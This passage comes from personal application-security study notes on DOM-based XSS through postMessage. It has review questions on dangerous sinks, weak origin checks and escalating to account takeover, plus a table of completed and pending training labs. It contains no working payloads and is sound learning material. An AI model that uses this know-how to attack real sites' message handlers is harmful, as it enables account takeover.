- [ ] What other sinks besides innerHTML, location.href, and element.src can lead to DOM XSS via postMessage?
- [ ] How does the Same-Origin Policy relate to postMessage? What does postMessage explicitly bypass?

### Practical Understanding
- [ ] You find a message listener that checks `e.origin.indexOf('trusted.com') > -1`. Is this safe? Why or why not?
- [ ] A developer says "we use JSON.parse on all postMessage data, so XSS is impossible." Why is this incorrect?
- [ ] How would you use Burp's DOM Invader to find postMessage vulnerabilities? What does it automate?
- [ ] Name three real-world web features that commonly use postMessage and could be vulnerable.
- [ ] If you find a postMessage DOM XSS, what steps would you take to escalate it to account takeover?

---

## §13 Related Labs

| Lab | Sink Type | Status |
|-----|-----------|--------|
| DOM XSS using web messages | innerHTML | ✅ Completed (this session) |
| DOM XSS using web messages and a JavaScript URL | location.href | ✅ Completed (this session) |
| DOM XSS using web messages and JSON.parse | iframe.src | ✅ Completed (this session) |
| DOM-based open redirection | location / navigation | 🔲 Not yet attempted |
| DOM-based cookie manipulation | document.cookie | 🔲 Not yet attempted |
| Exploiting DOM clobbering to enable XSS | DOM property overwrite | 🔲 EXPERT — Not yet attempted |
| Clobbering DOM attributes to bypass HTML filters | DOM attribute overwrite | 🔲 EXPERT — Not yet attempted |

---

*Day 45 — 180-Days-Of-AppSec — DOM-Based Vulnerabilities (Web Message Sources)*
